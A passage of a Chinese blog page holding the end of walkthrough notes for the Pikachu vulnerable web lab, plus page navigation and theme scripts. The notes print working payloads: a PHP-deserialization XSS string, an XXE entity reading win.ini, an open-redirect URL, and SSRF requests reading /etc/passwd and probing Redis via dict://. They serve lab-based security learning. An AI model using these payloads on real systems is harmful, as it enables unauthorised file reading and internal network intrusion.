+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(111)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>💣 输出 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;script&gt;alert(111)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交后成功触发 XSS ✅</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image88.png"></p>
+<hr>
+<h2 id="十、XXE-漏洞"><a href="#十、XXE-漏洞" class="headerlink" title="十、XXE 漏洞"></a>十、XXE 漏洞</h2><p><strong>📖 概念：</strong> XXE（XML External Entity）即 XML 外部实体注入，攻击者通过构造恶意 XML 文档，利用外部实体读取服务器文件或发起 SSRF 攻击。</p>
+<p><strong>💣 Payload（读取 Windows 系统文件）：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image89.png"></p>
+<hr>
+<h2 id="十一、不安全的-URL-跳转"><a href="#十一、不安全的-URL-跳转" class="headerlink" title="十一、不安全的 URL 跳转"></a>十一、不安全的 URL 跳转</h2><p><strong>📖 概念：</strong> 应用程序使用用户可控的参数作为跳转目标 URL，可被用于钓鱼攻击（将用户引导至恶意站点）。</p>
+<p><strong>💣 构造恶意跳转：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/urlredirect/urlredirect.php?url=http://baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image90.png"></p>
+<hr>
+<h2 id="十二、SSRF-服务端请求伪造"><a href="#十二、SSRF-服务端请求伪造" class="headerlink" title="十二、SSRF 服务端请求伪造"></a>十二、SSRF 服务端请求伪造</h2><blockquote>
+<p>🌐 SSRF（Server-Side Request Forgery）是指攻击者构造请求，由<strong>服务器</strong>代为发起，可访问内网资源、绕过防火墙。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 以下两个 SSRF 题目需要 <strong>PHP 7</strong> 版本才能正常运行。</p>
+</blockquote>
+<hr>
+<h3 id="12-1-SSRF（curl）"><a href="#12-1-SSRF（curl）" class="headerlink" title="12.1 SSRF（curl）"></a>12.1 SSRF（curl）</h3><p><strong>💣 利用 curl 访问内网资源：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image91.png"></p>
+<hr>
+<h3 id="12-2-SSRF（file-get-contents）"><a href="#12-2-SSRF（file-get-contents）" class="headerlink" title="12.2 SSRF（file_get_contents）"></a>12.2 SSRF（file_get_contents）</h3><p><strong>💣 利用 file_get_contents 访问内网资源：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure>
+
+<p>同样有效 ✅，还支持其他伪协议玩法，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd        # 读取本地文件</span><br><span class="line">dict://127.0.0.1:6379/    # 探测内网服务</span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>📝 <strong>笔记说明：</strong> 本文档基于 Pikachu 靶场实战整理，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。</p>
+</blockquote>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/f46202bc/">DVWA 靶场实验报告 (High Level)</a></div><div class="item" id="next"></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%90%BE-Pikachu-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0"><span class="toc-text">🐾 Pikachu 靶场通关笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9B%AE%E5%BD%95"><span class="toc-text">📚 目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-text">一、XSS 跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%88DOM%E5%9E%8B%EF%BC%89"><span class="toc-text">1.1 反射型 XSS（DOM型）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-DOM%E5%9E%8B-XSS-x"><span class="toc-text">1.2 DOM型 XSS-x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-XSS-%E7%9B%B2%E6%89%93"><span class="toc-text">1.3 XSS 盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-XSS-%E4%B9%8B%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">1.4 XSS 之过滤绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-XSS-%E4%B9%8B-htmlspecialchars"><span class="toc-text">1.5 XSS 之 htmlspecialchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-XSS-%E4%B9%8B-href-%E8%BE%93%E5%87%BA"><span class="toc-text">1.6 XSS 之 href 输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-XSS-%E4%B9%8B-JS-%E8%BE%93%E5%87%BA"><span class="toc-text">1.7 XSS 之 JS 输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">二、CSRF 跨站请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-CSRF%EF%BC%88GET%EF%BC%89"><span class="toc-text">2.1 CSRF（GET）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-CSRF%EF%BC%88POST%EF%BC%89"><span class="toc-text">2.2 CSRF（POST）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-CSRF-Token"><span class="toc-text">2.3 CSRF Token</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">三、SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.1 数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.2 字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.3 搜索型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-X-%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.4 X 型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-INSERT-UPDATE-%E6%B3%A8%E5%85%A5"><span class="toc-text">3.5 INSERT &#x2F; UPDATE 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-DELETE-%E6%B3%A8%E5%85%A5"><span class="toc-text">3.6 DELETE 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-HTTP-%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">3.7 HTTP 头注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-%E5%9F%BA%E4%BA%8E-Boolean-%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.8 基于 Boolean 的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-9-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.9 基于时间的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-10-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88Wide-Byte%EF%BC%89"><span class="toc-text">3.10 宽字节注入（Wide Byte）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">四、RCE 远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-exec-%E2%80%9Cping%E2%80%9D"><span class="toc-text">4.1 exec “ping”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-text">4.2 exec “eval”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E"><span class="toc-text">五、文件操作漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-text">5.1 本地文件包含（LFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="toc-text">5.2 远程文件包含（RFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">5.3 不安全的文件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E2%80%94-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="toc-text">5.4 文件上传 — 客户端校验绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E2%80%94-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="toc-text">5.5 文件上传 — 服务端校验绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-text">MIME 类型检测绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getimagesize-%E5%9B%BE%E7%89%87%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-text">getimagesize() 图片头检测绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">六、越权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-text">6.1 水平越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-text">6.2 垂直越权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">七、目录遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">八、敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">九、PHP 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-text">常见魔法函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-text">漏洞利用示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81XXE-%E6%BC%8F%E6%B4%9E"><span class="toc-text">十、XXE 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84-URL-%E8%B7%B3%E8%BD%AC"><span class="toc-text">十一、不安全的 URL 跳转</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81SSRF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">十二、SSRF 服务端请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#12-1-SSRF%EF%BC%88curl%EF%BC%89"><span class="toc-text">12.1 SSRF（curl）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-2-SSRF%EF%BC%88file-get-contents%EF%BC%89"><span class="toc-text">12.2 SSRF（file_get_contents）</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
